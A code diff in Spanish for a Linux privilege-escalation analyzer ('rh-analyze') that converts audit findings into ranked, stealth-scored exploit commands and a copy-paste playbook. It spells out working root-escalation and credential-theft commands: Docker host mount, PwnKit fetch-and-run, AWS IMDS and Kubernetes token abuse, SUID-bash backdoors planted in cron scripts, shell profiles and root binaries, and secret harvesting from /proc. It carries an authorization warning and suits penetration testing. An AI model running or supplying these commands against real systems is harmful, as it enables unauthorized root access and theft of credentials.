+        nopasswd = f.data.get('nopasswd', 'false') == 'true'
+        wildcard = f.data.get('wildcard', 'false') == 'true'
+        runas = f.data.get('runas', '')
+        key = (bin_name, path, nopasswd)
+        if key in seen_rules:
+            continue
+        seen_rules.add(key)
+        tech = gtfobins.lookup_sudo(bin_name) if bin_name else None
+        if tech is None:
+            continue
+        sev = 'critical' if nopasswd else 'warning'
+        ctx_parts = [f"Path: {path}",
+                     f"NOPASSWD: {'sí' if nopasswd else 'no (requiere password)'}"]
+        if runas:
+            ctx_parts.append(f"RunAs: {runas}")
+        if wildcard:
+            ctx_parts.append("wildcard en args")
+        rel, stl, spd = gtfobins.get_scoring(tech, 'sudo')
+        # Si requiere password, baja reliability (no siempre conoces el password)
+        if not nopasswd:
+            rel = max(1, rel - 2)
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        out.append({
+            'title':         f"sudo {bin_name}",
+            'severity':      sev,
+            'technique':     tech,
+            'extra_context': "  |  ".join(ctx_parts),
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'sudo',
+            'verification': _extract_verification(f),
+        })
+
+    # ─── 3) Capabilities ────────────────────────────────────────────────
+    for f in r.find_by_type('capability_dangerous'):
+        cap_name = f.data.get('capability', '')
+        bin_path = f.data.get('path', '')
+        bin_name = f.data.get('binary', '')
+        cap_info = gtfobins.lookup_capability(cap_name) if cap_name else None
+        if cap_info is None:
+            continue
+        exploits_for_cap = cap_info.get('exploits', {})
+        # Buscar técnica con matching inteligente: exacto > simplificado > prefijo
+        tech = exploits_for_cap.get(bin_name)
+        if tech is None:
+            simplified = re.sub(r'[\d.]+$', '', bin_name)
+            if simplified and simplified != bin_name:
+                tech = exploits_for_cap.get(simplified)
+        if tech is None:
+            base = re.match(r'^([a-z]+)', bin_name)
+            if base:
+                tech = exploits_for_cap.get(base.group(1))
+        if tech is None:
+            continue
+        rel, stl, spd = gtfobins.get_scoring(tech, 'capability')
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        out.append({
+            'title':         f"{cap_name} en {bin_path}",
+            'severity':      'critical',
+            'technique':     tech,
+            'extra_context': f"Binario: {bin_name}  |  "
+                             f"{cap_info.get('description', '')}",
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'capability',
+            'verification': _extract_verification(f),
+        })
+
+    # ─── 4) Vectores especiales (no en gtfobins, hardcoded) ─────────────
+    # Cada uno trae sus reliability/stealth/speed inline.
+
+    if r.has_type('docker_socket_writable') or r.has_type('user_in_docker_group'):
+        f_sock = r.find_by_type('docker_socket_writable')
+        if f_sock:
+            ctx = f"Socket: {f_sock[0].data.get('path', '/var/run/docker.sock')}"
+        else:
+            ctx = "Vector: membresía en grupo 'docker'"
+        # Docker es muy reliable pero ruidoso
+        rel, stl, spd = 5, 2, 5
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        out.append({
+            'title':         "Acceso a Docker → root del host",
+            'severity':      'critical',
+            'technique': {
+                'verify':  'docker ps',
+                'exploit': 'docker run -v /:/host --rm -it alpine chroot /host sh',
+                'why':     'docker monta el FS del host; chroot da acceso total',
+                'success': 'prompt # con id mostrando uid=0 sobre el FS del host',
+                'ref':     'https://gtfobins.github.io/gtfobins/docker/',
+            },
+            'extra_context': ctx,
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'special',
+        })
+
+    if r.has_type('cve_pwnkit'):
+        f = r.find_by_type('cve_pwnkit')[0]
+        ver = f.data.get('version', '?')
+        # PwnKit: confiable pero muy publicado, EDR moderno lo detecta
+        rel, stl, spd = 4, 2, 4
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        out.append({
+            'title':         "PwnKit (CVE-2021-4034)",
+            'severity':      'critical',
+            'technique': {
+                'verify':  f'pkexec --version  # esperado: < 0.120 (visto: {ver})',
+                'exploit': 'git clone https://github.com/ly4k/PwnKit && '
+                           'cd PwnKit && ./PwnKit',
+                'why':     'manipulación de argv permite escalada a root sin auth',
+                'success': 'shell como root sin password',
+                'ref':     'https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt',
+            },
+            'extra_context': f"pkexec versión {ver} < 0.120",
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'special',
+        })
+
+    if r.has_type('k8s_serviceaccount_token'):
+        f = r.find_by_type('k8s_serviceaccount_token')[0]
+        ns = f.data.get('namespace', '?')
+        token_path = f.data.get('path',
+            '/var/run/secrets/kubernetes.io/serviceaccount/token')
+        # K8s token: confiable, exploración no es destructiva
+        rel, stl, spd = 4, 4, 4
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        out.append({
+            'title':         "Kubernetes ServiceAccount token",
+            'severity':      'critical',
+            'technique': {
+                'verify':  f"TOKEN=$(cat {token_path}); "
+                           f"kubectl --token=$TOKEN auth can-i --list -n {ns}",
+                'exploit': 'kubectl --token=$TOKEN get secrets,pods -A',
+                'why':     'el token autentica como la SA; permisos según cluster',
+                'success': 'se listan recursos del cluster sin "forbidden"',
+                'ref':     'https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security',
+            },
+            'extra_context': f"Namespace: {ns}",
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'special',
+        })
+
+    if r.has_type('aws_iam_credentials_exposed'):
+        f = r.find_by_type('aws_iam_credentials_exposed')[0]
+        role = f.data.get('role', '?')
+        rel, stl, spd = 5, 3, 4
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        out.append({
+            'title':         "AWS credenciales temporales vía IMDS",
+            'severity':      'critical',
+            'technique': {
+                'verify':  f'curl -s http://169.254.169.254/'
+                           f'latest/meta-data/iam/security-credentials/{role}',
+                'exploit': 'export AWS_ACCESS_KEY_ID=...; '
+                           'export AWS_SECRET_ACCESS_KEY=...; '
+                           'export AWS_SESSION_TOKEN=...; '
+                           'aws sts get-caller-identity',
+                'why':     'IMDS sin token expone credenciales del rol IAM',
+                'success': '`aws sts get-caller-identity` devuelve el rol',
+                'ref':     'https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/',
+            },
+            'extra_context': f"Rol IAM: {role}",
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'special',
+        })
+
+    if r.has_type('nfs_no_root_squash'):
+        f = r.find_by_type('nfs_no_root_squash')[0]
+        share = f.data.get('share', '?')
+        rel, stl, spd = 4, 3, 3
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        out.append({
+            'title':         "NFS con no_root_squash",
+            'severity':      'critical',
+            'technique': {
+                'verify':  'showmount -e <target>',
+                'exploit': f'sudo mount -t nfs <target>:{share} /mnt && '
+                           f'sudo cp /bin/bash /mnt/.b && '
+                           f'sudo chown root:root /mnt/.b && '
+                           f'sudo chmod u+s /mnt/.b',
+                'why':     'sin root_squash, root del cliente = root del NFS',
+                'success': 'en target: /<mount>/.b -p da euid=0',
+                'ref':     'https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting',
+            },
+            'extra_context': f"Share: {share}",
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'special',
+        })
+
+    for f in r.find_by_type('cron_writable_script')[:3]:
+        script = f.data.get('script', '?')
+        cron_owner = f.data.get('cron_owner', '?')
+        cron_source = f.data.get('cron_source', '?')
+        # Cron: confiable pero requiere espera (hasta 1h) y deja artefactos
+        rel, stl, spd = 4, 3, 2
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        out.append({
+            'title':         f"Script cron escribible: {script}",
+            'severity':      'critical',
+            'technique': {
+                'verify':  f'ls -la {script}; cat {cron_source}',
+                'exploit': f"echo 'cp /bin/bash /tmp/.b && chmod u+s /tmp/.b' "
+                           f">> {script}",
+                'why':     'el cron ejecuta el script; modificarlo da exec como owner',
+                'success': f'tras la próxima ejecución, /tmp/.b -p da shell como {cron_owner}',
+                'notes':   'Espera de hasta 1 hora dependiendo de la cadencia del cron',
+                'ref':     'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs',
+            },
+            'extra_context': f"Cron: {cron_source}  |  Owner: {cron_owner}",
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'special',
+        })
+
+    # ─── 5) Procesos: binarios root escribibles ──────────────────────────
+    for f in r.find_by_type('process_root_writable_binary')[:3]:
+        path = f.data.get('path', '?')
+        pid = f.data.get('pid', '?')
+        cmd_short = (f.data.get('cmd', '') or '')[:80]
+        # Reliability alto (modificar binario funciona), pero speed bajo:
+        # hay que esperar al reinicio del proceso (puede ser cuando reinicia
+        # el host o el servicio). Stealth bajo porque modificar binarios root
+        # deja huellas.
+        rel, stl, spd = 4, 2, 2
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        out.append({
+            'title':         f"Binario root escribible: {path}",
+            'severity':      'critical',
+            'technique': {
+                'verify':  f'ls -la {path}; ps -p {pid} -o pid,user,cmd',
+                'exploit': f'cp $(which bash) /tmp/.orig_b && '
+                           f'cat > {path} <<\'EOF\'\n#!/bin/bash\ncp /bin/bash /tmp/.b && chmod u+s /tmp/.b\nexec /tmp/.orig_b "$@"\nEOF\n'
+                           f'chmod +x {path}  # luego esperar reinicio del proceso',
+                'why':     'al reinicio del proceso, el wrapper se ejecuta como root',
+                'success': '/tmp/.b -p da shell como root tras el restart',
+                'notes':   'Riesgo de romper el servicio si el wrapper falla — probar primero con copia',
+                'ref':     'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files-of-services',
+            },
+            'extra_context': f"PID: {pid}  |  cmd: {cmd_short}",
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'special',
+        })
+
+    # ─── 6) Procesos: secretos en /proc/*/environ ────────────────────────
+    env_secrets = r.find_by_type('process_env_secret')
+    if env_secrets:
+        # Solo emitimos UN bloque resumen — el detalle por var queda en el reporte
+        # Reliability=5 (el secret está ahí o no), stealth=5 (solo lectura),
+        # speed=5 (instant) — esto es tier 1 score 20, el "win fácil" clásico
+        rel, stl, spd = 5, 5, 5
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        # Lista los primeros 3 PIDs únicos
+        pids_seen = []
+        for ef in env_secrets:
+            p = ef.data.get('pid', '?')
+            if p not in pids_seen:
+                pids_seen.append(p)
+            if len(pids_seen) >= 3:
+                break
+        first_pid = env_secrets[0].data.get('pid', '?')
+        first_var = env_secrets[0].data.get('var', '?')
+        out.append({
+            'title':         f"Secretos en /proc/<pid>/environ ({len(env_secrets)} hits)",
+            'severity':      'critical',
+            'technique': {
+                'verify':  f'cat /proc/{first_pid}/environ | tr "\\0" "\\n" | grep -iE "(PASSWORD|SECRET|TOKEN|KEY|API)"',
+                'exploit': '# Para cada PID detectado, leer environ y extraer credenciales:\n'
+                           f'for pid in {" ".join(pids_seen)}; do '
+                           'cat /proc/$pid/environ | tr "\\0" "\\n" | grep -iE "(PASSWORD|SECRET|TOKEN|KEY|API)"; done',
+                'why':     'el environ del proceso a menudo contiene credenciales que el daemon recibió al arrancar',
+                'success': 'variables tipo AWS_SECRET_ACCESS_KEY, DB_PASSWORD, etc. visibles en plaintext',
+                'notes':   f'Primer hit: var="{first_var}" en PID {first_pid}',
+                'ref':     'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#proc-pid-environ',
+            },
+            'extra_context': f'PIDs con secretos: {", ".join(pids_seen)}'
+                             + ('...' if len(env_secrets) > 3 else ''),
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'special',
+        })
+
+    # ─── 7) Procesos: passwords en /proc/*/cmdline ───────────────────────
+    cmd_secrets = r.find_by_type('process_cmdline_secret')
+    if cmd_secrets:
+        rel, stl, spd = 5, 5, 5
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        first_pid = cmd_secrets[0].data.get('pid', '?')
+        out.append({
+            'title':         f"Passwords en /proc/<pid>/cmdline ({len(cmd_secrets)} hits)",
+            'severity':      'critical',
+            'technique': {
+                'verify':  f'tr "\\0" " " < /proc/{first_pid}/cmdline; echo',
+                'exploit': '# Leer cmdline de cada PID detectado:\n'
+                           'ps -ef | grep -iE "(-p|--password|MYSQL_PWD|PGPASSWORD)"',
+                'why':     'algunos comandos pasan password como argumento, visible en /proc/<pid>/cmdline',
+                'success': 'password en plaintext extraído del cmdline',
+                'notes':   'Uso típico: mysql -uroot -ppass, curl -u user:pass, sshpass -ppass',
+                'ref':     'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#proc-pid-cmdline',
+            },
+            'extra_context': f"{len(cmd_secrets)} procesos con passwords en argumentos",
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'special',
+        })
+
+    # ─── 8) Sockets unix escribibles ──────────────────────────────────────
+    for f in r.find_by_type('unix_socket_writable')[:3]:
+        sock_path = f.data.get('path', '?')
+        sock_owner = f.data.get('owner', '?')
+        # La explotabilidad real depende del daemon que escucha. Reliability=3
+        # porque algunos daemons (Redis) son trivialmente abusables, otros
+        # requieren protocolo específico. Speed=3 (depende del daemon).
+        rel, stl, spd = 3, 3, 3
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        out.append({
+            'title':         f"Socket unix escribible: {sock_path}",
+            'severity':      'critical',
+            'technique': {
+                'verify':  f'ls -la {sock_path}; lsof {sock_path} 2>/dev/null',
+                'exploit': '# Identificar daemon detrás del socket y su protocolo:\n'
+                           f'sudo lsof {sock_path}    # ver qué proceso lo abrió\n'
+                           f'echo "PING" | nc -U {sock_path}    # algunos daemons responden directo\n'
+                           '# Casos típicos:\n'
+                           '#   Redis: nc -U <sock>; CONFIG SET dir /etc; CONFIG SET dbfilename cron.d/r; SET x ...\n'
+                           '#   Docker: similar a docker.sock — ver módulo containers\n'
+                           '#   PostgreSQL: psql -h <sock> -U postgres',
+                'why':     'el socket expone una API del daemon; con escritura podemos invocar comandos',
+                'success': 'depende del daemon — desde RCE (Redis) hasta DB takeover (PostgreSQL)',
+                'notes':   f'Owner del socket: {sock_owner}. Identifica el daemon antes de elegir vector.',
+                'ref':     'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-sockets',
+            },
+            'extra_context': f"Owner: {sock_owner}  |  Perms: {f.data.get('perms', '?')}",
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'special',
+        })
+
+    # ─── 9) Configs de shell escribibles ─────────────────────────────────
+    shell_rc = r.find_by_type('shell_rc_writable')
+    profile_d = r.find_by_type('profile_d_writable')
+
+    if profile_d:
+        # /etc/profile.d/* afecta a TODOS los usuarios al hacer login
+        # Reliability=5, stealth=2 (script extra es notable), speed=1 (esperar login)
+        rel, stl, spd = 5, 2, 1
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        first = profile_d[0].data.get('path', '?')
+        out.append({
+            'title':         f"/etc/profile.d/* escribible ({len(profile_d)} archivos)",
+            'severity':      'critical',
+            'technique': {
+                'verify':  f'ls -la {first}; who  # ver usuarios con sesiones activas',
+                'exploit': f"echo 'cp /bin/bash /tmp/.b && chmod u+s /tmp/.b' >> {first}",
+                'why':     '/etc/profile.d/* se carga en cada login interactivo (incluido root)',
+                'success': 'al próximo login de root o cualquier user con sesión nueva, /tmp/.b -p da shell',
+                'notes':   'Espera puede ser larga si nadie hace login nuevo — combinar con who para timing',
+                'ref':     'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profile-files',
+            },
+            'extra_context': f"Primer archivo: {first}",
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'special',
+        })
+
+    if shell_rc:
+        # .bashrc/.zshrc de otro usuario — escalada al login de ese usuario específico
+        # Reliability=4, stealth=3, speed=1 (esperar login del usuario)
+        rel, stl, spd = 4, 3, 1
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        # Listar hasta 3 paths/owners
+        targets = []
+        for srf in shell_rc[:3]:
+            scope = srf.data.get('scope', '')
+            owner = srf.data.get('owner', '')
+            label = owner if owner else (scope or '?')
+            targets.append(f"{srf.data.get('path', '?')} ({label})")
+        # Para el verify/exploit usar preferentemente un .bashrc de usuario, no global
+        # (los globales son más obvios). Buscamos el primer scope='user'.
+        chosen = None
+        for srf in shell_rc:
+            if srf.data.get('scope') == 'user':
+                chosen = srf
+                break
+        if chosen is None:
+            chosen = shell_rc[0]
+        chosen_path = chosen.data.get('path', '?')
+        chosen_owner = chosen.data.get('owner', '')
+        chosen_scope = chosen.data.get('scope', '')
+
+        # Construir verify según si es global o por user
+        if chosen_owner:
+            verify_cmd = f'ls -la {chosen_path}; last -n 5 {chosen_owner}    # ver actividad del user'
+            success_msg = f'al próximo login de {chosen_owner}, /tmp/.b -p da shell con privilegios de {chosen_owner}'
+        else:
+            verify_cmd = f'ls -la {chosen_path}; who    # ver usuarios con sesiones activas'
+            success_msg = 'al próximo login de cualquier usuario afectado, /tmp/.b -p da shell'
+
+        out.append({
+            'title':         f"Config shell escribible ({len(shell_rc)} archivos)",
+            'severity':      'critical',
+            'technique': {
+                'verify':  verify_cmd,
+                'exploit': f"echo 'cp /bin/bash /tmp/.b && chmod u+s /tmp/.b 2>/dev/null' >> {chosen_path}",
+                'why':     'el .bashrc/.zshrc se carga al login interactivo de ese usuario',
+                'success': success_msg,
+                'notes':   'Si el usuario no hace login nunca, el vector no se dispara — ver `last` para estimar',
+                'ref':     'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#bashrc',
+            },
+            'extra_context': "  |  ".join(targets),
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'special',
+        })
+
+    return out
+
+
+def _tier_label(tier: int) -> tuple[str, str]:
+    """Devuelve (etiqueta, color) para un tier."""
+    if tier == 1:
+        return "TIER 1 — WIN FÁCIL (intenta primero)", C.GREEN
+    if tier == 2:
+        return "TIER 2 — PLAN B (si tier 1 falla)", C.YELLOW
+    return "TIER 3 — ÚLTIMO RECURSO (frágil o ruidoso)", C.RED
+
+
+def render_actionable_commands(r: Report):
+    """Para cada finding estructurado relevante, sugiere el comando exacto.
+
+    Las técnicas se agrupan por tier (1=win fácil, 2=plan B, 3=último recurso)
+    y dentro de cada tier se ordenan por score descendente. Eso replica el
+    flujo mental de un pentester: empezar por lo que más probable funciona.
+    Solo funciona con reportes schema v2.
+    """
+    print(f"{C.BOLD}── Comandos sugeridos (priorizados) ──{C.RESET}")
+
+    if gtfobins is None:
+        print(f"  {C.YELLOW}Advertencia: gtfobins.py no se pudo cargar.{C.RESET}")
+        print(f"  {C.DIM}Verifica que esté en el mismo directorio que rh-analyze.{C.RESET}\n")
+        return
+
+    if not r.is_v2():
+        print(f"  {C.YELLOW}El reporte es v1 (legacy) — no contiene findings estructurados.{C.RESET}")
+        print(f"  {C.DIM}Re-ejecutar roothunter.sh ≥ v1.1 para obtener comandos exactos.{C.RESET}\n")
+        return
+
+    techniques = collect_techniques(r)
+
+    # ─── SUID legítimos (whitelist) — informativo arriba ────────────────
+    suid_findings = r.find_by_type('suid_dangerous')
+    legitimate = []
+    no_technique = []
+    for f in suid_findings:
+        ok, reason = is_suid_legitimate(f, r)
+        if ok:
+            legitimate.append((f, reason))
+            continue
+        bin_name = f.data.get('binary', '')
+        if gtfobins.lookup_suid(bin_name) is None:
+            no_technique.append(f)
+    if legitimate:
+        print(f"\n  {C.DIM}SUID legítimos del sistema (whitelist): {len(legitimate)}"
+              f" — omitidos del análisis ofensivo{C.RESET}")
+        for f, reason in legitimate[:5]:
+            print(f"    {C.DIM}· {f.data.get('path', '?')}  ({reason}){C.RESET}")
+        if len(legitimate) > 5:
+            print(f"    {C.DIM}... y {len(legitimate) - 5} más{C.RESET}")
+
+    # ─── Render por tier ────────────────────────────────────────────────
+    if not techniques:
+        print(f"\n  {C.GREEN}No se encontraron vectores con comando concreto sugerible.{C.RESET}")
+        print(f"  {C.DIM}Esto NO significa que el sistema sea seguro — revisar también")
+        print(f"  --paths y --exploits para vectores que no producen comando directo.{C.RESET}\n")
+        # Aún así, mostrar SUID sin técnica documentada
+        if no_technique:
+            print(f"  {C.YELLOW}SUID sin técnica documentada en la base local "
+                  f"(revisar manualmente):{C.RESET}")
+            for f in no_technique:
+                bn = f.data.get('binary', '?')
+                print(f"    · {f.data.get('path', '?')}  "
+                      f"→ https://gtfobins.github.io/gtfobins/{bn}/")
+            print()
+        return
+
+    # Orden: tier asc, dentro de cada tier los verificados primero,
+    # luego score desc. Esto pone al frente lo que sabemos que funciona.
+    def _sort_key(t):
+        v = t.get('verification', {}).get('verified', 'unknown')
+        # Prioridad: verified=true > unknown > false (lo que falló al verificar
+        # va al fondo porque sabemos que NO funciona)
+        verified_priority = {'true': 0, 'unknown': 1, 'false': 2}.get(v, 1)
+        return (t['tier'], verified_priority, -t['score'])
+    techniques.sort(key=_sort_key)
+
+    current_tier = None
+    for t in techniques:
+        if t['tier'] != current_tier:
+            current_tier = t['tier']
+            label, color = _tier_label(current_tier)
+            print(f"\n  {color}{C.BOLD}▶ {label}{C.RESET}")
+
+        # Badge de verificación: depende del estado en el finding
+        v = t.get('verification', {})
+        v_status = v.get('verified', 'unknown')
+        v_level = v.get('verified_at_level', 'none')
+        if v_status == 'true':
+            badge = f"{C.GREEN}✓ VERIFICADO{C.RESET}"
+            if v_level and v_level != 'none':
+                badge += f" {C.DIM}({v_level}){C.RESET}"
+        elif v_status == 'false':
+            badge = f"{C.RED}✗ NO VIABLE{C.RESET} {C.DIM}(precondition falló){C.RESET}"
+        else:
+            badge = f"{C.DIM}? sin verificar{C.RESET}"
+
+        # Línea de score visible
+        score_line = (f"  reliability={t['reliability']}  "
+                      f"stealth={t['stealth']}  "
+                      f"speed={t['speed']}  "
+                      f"→ score={t['score']}")
+        print(f"\n  {C.DIM}[score {t['score']}/25]{C.RESET}  "
+              f"{C.BOLD}{t['title']}{C.RESET}  {badge}")
+        print(f"    {C.DIM}{score_line}{C.RESET}")
+        if t['extra_context']:
+            print(f"    {C.DIM}{t['extra_context']}{C.RESET}")
+        # Si hay output de verify, mostrarlo (ayuda a entender por qué pasó/falló)
+        v_out = v.get('verify_output', '')
+        if v_out and v_status in ('true', 'false'):
+            print(f"    {C.DIM}Verify output: {v_out[:80]}{C.RESET}")
+        tech = t['technique']
+        if tech.get('why'):
+            print(f"    {C.DIM}Por qué funciona:{C.RESET} {tech['why']}")
+        if tech.get('verify'):
+            print(f"    {C.CYAN}Verificar:{C.RESET}  {tech['verify']}")
+        if tech.get('exploit'):
+            print(f"    {C.RED}Explotar:{C.RESET}   {tech['exploit']}")
+        if tech.get('success'):
+            print(f"    {C.GREEN}Éxito si:{C.RESET}   {tech['success']}")
+        if tech.get('notes'):
+            print(f"    {C.YELLOW}Notas:{C.RESET}      {tech['notes']}")
+        if tech.get('ref'):
+            print(f"    {C.DIM}Referencia: {tech['ref']}{C.RESET}")
+
+    # SUID sin técnica al final
+    if no_technique:
+        print(f"\n  {C.YELLOW}SUID sin técnica documentada en la base local "
+              f"(revisar manualmente):{C.RESET}")
+        for f in no_technique:
+            bn = f.data.get('binary', '?')
+            print(f"    · {f.data.get('path', '?')}  "
+                  f"→ https://gtfobins.github.io/gtfobins/{bn}/")
+
+    # Cierre con resumen por tier y estado de verificación
+    by_tier = {1: 0, 2: 0, 3: 0}
+    by_verified = {'true': 0, 'false': 0, 'unknown': 0}
+    # Solo contamos verificación en kinds que pueden ser verificados (suid/sudo/capability)
+    verifiable_kinds = {'suid', 'sudo', 'capability'}
+    verifiable_total = 0
+    for t in techniques:
+        by_tier[t['tier']] += 1
+        if t.get('kind') in verifiable_kinds:
+            verifiable_total += 1
+            v = t.get('verification', {}).get('verified', 'unknown')
+            by_verified[v] = by_verified.get(v, 0) + 1
+    print(f"\n  {C.DIM}Resumen: tier 1 = {by_tier[1]}, "
+          f"tier 2 = {by_tier[2]}, "
+          f"tier 3 = {by_tier[3]}{C.RESET}")
+    if verifiable_total > 0:
+        if by_verified['true'] or by_verified['false']:
+            print(f"  {C.DIM}Verificación: "
+                  f"{C.GREEN}✓ {by_verified['true']} confirmados{C.RESET}{C.DIM}, "
+                  f"{C.RED}✗ {by_verified['false']} no viables{C.RESET}{C.DIM}, "
+                  f"? {by_verified['unknown']} sin verificar{C.RESET}")
+        elif by_verified['unknown'] == verifiable_total:
+            print(f"  {C.DIM}Para confirmar vectores SUID/sudo/capabilities: "
+                  f"re-ejecutar roothunter.sh con -V{C.RESET}")
+    print(f"  {C.YELLOW}⚠  Estos comandos son material defensivo: úsalos solo en sistemas")
+    print(f"  con autorización explícita.{C.RESET}\n")
+
+
+def render_confirm(r: Report):
+    """Modo --confirm: ejecuta el dry_run de gtfobins.py localmente para
+    cada técnica accionable, e imprime "CONFIRMADO" si el output coincide.
+
+    REQUIERE estar ejecutándose EN EL HOST OBJETIVO. Ejecuta comandos reales
+    no-destructivos del sistema. Es opt-in (nunca corre por defecto).
+
+    Cada dry_run debe cumplir las tres reglas inviolables:
+       1. NO spawnea shell interactiva
+       2. NO modifica el sistema
+       3. NO hace conexiones de red salientes
+    Esas reglas las garantiza gtfobins.py al definir las técnicas.
+    """
+    import subprocess
+
+    print(f"{C.BOLD}── Confirmación con dry_run (opt-in) ──{C.RESET}")
+    print(f"  {C.YELLOW}⚠  Ejecutando comandos no-destructivos en este host{C.RESET}")
+    print(f"  {C.YELLOW}⚠  Solo usar si estás autorizado en este sistema{C.RESET}\n")
+
+    if gtfobins is None or not r.is_v2():
+        print(f"  {C.RED}--confirm requiere gtfobins.py + reporte schema v2{C.RESET}")
+        return
+
+    techniques = collect_techniques(r)
+    if not techniques:
+        print(f"  {C.GREEN}No hay técnicas accionables que confirmar.{C.RESET}\n")
+        return
+
+    confirmed = 0
+    failed = 0
+    skipped = 0
+
+    for t in techniques:
+        # Solo intentamos dry_run en SUID/sudo/capability (los que vienen de gtfobins).
+        # Los 'special' (Docker, K8s, IMDS) no tienen dry_run estandarizado aquí.
+        if t['kind'] not in ('suid', 'sudo', 'capability'):
+            continue
+
+        # Si el verifier de roothunter ya marcó verified=false, NO ejecutamos
+        # el dry_run — la precondition no se cumple y sería desperdicio
+        v = t.get('verification', {})
+        if v.get('verified') == 'false':
+            print(f"  {C.DIM}↳ {t['title']:40} - skip (precondition falló){C.RESET}")
+            skipped += 1
+            continue
+
+        dry = gtfobins.get_dry_run(t['technique'])
+        if dry is None:
+            print(f"  {C.DIM}↳ {t['title']:40} - skip (sin dry_run seguro){C.RESET}")
+            skipped += 1
+            continue
+
+        cmd, expected = dry
+
+        # Ejecutar con timeout. Capturamos stdout+stderr.
+        try:
+            proc = subprocess.run(
+                ['bash', '-c', cmd],
+                capture_output=True, text=True, timeout=10,
+            )
+            output = (proc.stdout + proc.stderr).strip()[:200]
+        except subprocess.TimeoutExpired:
+            output = '<timeout>'
+        except Exception as e:
+            output = f'<error: {e}>'
+
+        # Heurística simple para ver si el output coincide con expected.
+        # Buscamos marcadores DRYRUN_ o euid=0 o uid=0 en el output.
+        ok = False
+        markers = ['DRYRUN_EUID= 0', 'DRYRUN_UID= 0', 'uid=0(root)',
+                   'DRYRUN_EUID=0', 'DRYRUN_UID=0',
+                   'DRYRUN_SHADOW=']
+        if any(m in output for m in markers):
+            ok = True
+
+        if ok:
+            print(f"  {C.GREEN}✓ CONFIRMADO{C.RESET}  {t['title']:40}")
+            print(f"    {C.DIM}output: {output[:100]}{C.RESET}")
+            confirmed += 1
+        else:
+            print(f"  {C.RED}✗ NO CONFIRMADO{C.RESET}  {t['title']:40}")
+            print(f"    {C.DIM}esperado: {expected[:80]}{C.RESET}")
+            print(f"    {C.DIM}obtenido: {output[:80] if output else '(sin output)'}{C.RESET}")
+            failed += 1
+
+    print(f"\n  {C.BOLD}Confirmación completada:{C.RESET}")
+    print(f"    {C.GREEN}✓ {confirmed} confirmados{C.RESET}")
+    print(f"    {C.RED}✗ {failed} no confirmados{C.RESET}")
+    print(f"    {C.DIM}- {skipped} skipped (sin dry_run seguro o ya descartados){C.RESET}")
+    print()
+
+
+def render_playbook(r: Report):
+    """Modo copy-paste: solo comandos en orden de prioridad, sin metadata.
+
+    Ideal para tener notas en .txt. Cada técnica imprime el comando de
+    verify y el de exploit, agrupados por tier.
+    """
+    if gtfobins is None or not r.is_v2():
+        print("# Playbook no disponible: requiere reporte schema v2 + gtfobins.py")
+        return
+
+    techniques = collect_techniques(r)
+    if not techniques:
+        print("# Sin técnicas accionables detectadas.")
+        return
+
+    techniques.sort(key=lambda t: (t['tier'], -t['score']))
+
+    print(f"# Playbook generado por rh-analyze — {r.hostname}")
+    print(f"# Auditado: {r.timestamp}")
+    print(f"# {len(techniques)} técnicas en orden de prioridad\n")
+
+    current_tier = None
+    for t in techniques:
+        if t['tier'] != current_tier:
+            current_tier = t['tier']
+            label, _ = _tier_label(current_tier)
+            print(f"\n# ─── {label} ───")
+        print(f"\n# {t['title']}  [score {t['score']}/25]")
+        if t['extra_context']:
+            print(f"# {t['extra_context']}")
+        tech = t['technique']
+        if tech.get('verify'):
+            print(f"#   verify:")
+            print(f"{tech['verify']}")
+        if tech.get('exploit'):
+            print(f"#   exploit:")
+            print(f"{tech['exploit']}")
 
 
 def render_summary(r: Report):
@@ -598,10 +1902,13 @@ def export_markdown(r: Report, path: Path):
         for e in applicable:
             md.append(f"### {e.name}")
             md.append(f"- **Severidad:** {e.severity}")
+            md.append(f"- **Confianza:** {e.confidence}")
             md.append(f"- **CVE/Ref:** {e.cve}")
